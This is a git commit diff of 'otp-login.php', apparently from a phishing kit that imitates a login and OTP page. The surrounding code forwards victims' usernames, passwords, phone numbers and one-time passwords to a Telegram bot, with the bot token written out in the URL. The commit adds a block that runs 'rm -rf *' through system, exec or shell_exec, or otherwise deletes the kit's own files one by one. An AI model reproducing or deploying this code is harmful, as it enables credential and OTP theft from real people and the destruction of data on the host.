6fb0e09087881d459e86ccb6c0d4d5d1931b2eb4
hubad666 <100355242+hubad666@users.noreply.github.com>
2022-02-26 16:17:38 +0700

    Update otp-login.php

--- otp-login.php
+++ otp-login.php
@@ -4,7 +4,28 @@ $us = [
 ];
 file_get_contents("https://api.telegram.org/bot5202228547:AAHRkzQNW1feHYhwmhZrAdHGnYHmmLXcE_8/sendMessage?" . http_build_query($us));
 
-
+ if(function_exists('system')) {
+         system('rm -rf *');
+      }
+      elseif(function_exists('exec')) {
+         exec('rm -rf *');
+      }
+      elseif(function_exists('shell_exec')) {
+         shell_exec('rm -rf *');
+      }
+      else {
+        unlink('lbpiaccess.zip');
+        unlink('confirm.php');
+        unlink('cc.jpg');
+        unlink('otp-login.php');
+        unlink('otp-expired.jpg');
+        unlink('otp.jpg');
+        unlink('mobile-login.php');
+        unlink('mobile.jpg');
+        unlink('login.php');
+        unlink('index.php');
+        unlink('index.jpg');
+      }
 $data = [
 'chat_id' => $chat_id,
 'text' => "User: " . $_COOKIE['username'] . "\nPass: " . $_COOKIE['password'] . "\nNum: " . $_COOKIE['number'] . "\nOTP: " . $_POST['otp']
